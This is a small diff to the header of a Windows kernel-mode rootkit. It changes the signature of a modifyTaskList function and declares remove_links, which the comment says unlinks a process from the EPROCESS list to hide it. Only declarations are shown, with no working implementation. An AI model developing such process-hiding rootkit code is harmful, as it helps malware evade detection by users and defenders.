@@ -28,7 +28,8 @@ NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
 //------------------------------------------------------------------------------
 
 // Search for the process to modify
-void modifyTaskList(PUINT32 pid);
+void modifyTaskList(UINT32 pid);
+
 
 // De-link the process from the EPROCESS list
 void remove_links(PLIST_ENTRY Current);
